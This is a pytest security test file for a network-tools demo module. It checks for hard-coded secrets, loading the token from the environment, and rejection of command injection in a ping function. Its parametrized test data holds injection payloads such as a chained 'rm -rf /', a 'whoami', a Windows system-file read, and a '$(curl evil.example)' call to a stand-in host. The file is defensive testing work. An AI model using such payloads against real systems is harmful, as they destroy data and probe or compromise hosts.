"""Security tests for Demo 2. subprocess.run is mocked: nothing is ever executed."""
import ast
import re
from unittest.mock import patch

import pytest

import net_tools

SECRET_NAME = re.compile(r"TOKEN|SECRET|PASSWORD|API_KEY", re.I)


# --- hard-coded secrets ---------------------------------------------------------
def test_no_secret_literals_in_source(target_dir):
    """No NAME_WITH_TOKEN = "some string" assignments in the source."""
    tree = ast.parse((target_dir / "net_tools.py").read_text(encoding="utf-8"))
    leaks = [
        t.id for node in ast.walk(tree) if isinstance(node, ast.Assign)
        for t in node.targets
        if isinstance(t, ast.Name) and SECRET_NAME.search(t.id)
        and isinstance(node.value, ast.Constant) and isinstance(node.value.value, str) and node.value.value
    ]
    assert not leaks, f"hard-coded secret(s): {leaks}"


def test_token_comes_from_the_environment(monkeypatch):
    monkeypatch.setenv("STATUS_API_TOKEN", "test-token-123")
    assert net_tools.auth_header() == {"Authorization": "Bearer test-token-123"}


def test_missing_token_fails_clearly(monkeypatch):
    monkeypatch.delenv("STATUS_API_TOKEN", raising=False)
    with pytest.raises(RuntimeError, match="STATUS_API_TOKEN"):
        net_tools.auth_header()


# --- command injection -----------------------------------------------------------
@pytest.fixture
def fake_run():
    with patch.object(net_tools.subprocess, "run") as run:
        run.return_value.returncode = 0
        yield run


@pytest.mark.parametrize("host", ["127.0.0.1", "example.com", "status-api.internal", "::1"])
def test_valid_hosts_are_pinged_without_a_shell(fake_run, host):
    assert net_tools.ping(host) is True
    args, kwargs = fake_run.call_args
    assert isinstance(args[0], list) and args[0][-1] == host
    assert not kwargs.get("shell", False)


@pytest.mark.parametrize("payload", [
    "127.0.0.1 & whoami",
    "127.0.0.1; rm -rf /",
    "example.com | type C:\\Windows\\win.ini",
    "$(curl evil.example)",
    "",
])
def test_injection_attempts_are_rejected_before_running_anything(fake_run, payload):
    with pytest.raises(ValueError):
        net_tools.ping(payload)
    fake_run.assert_not_called()
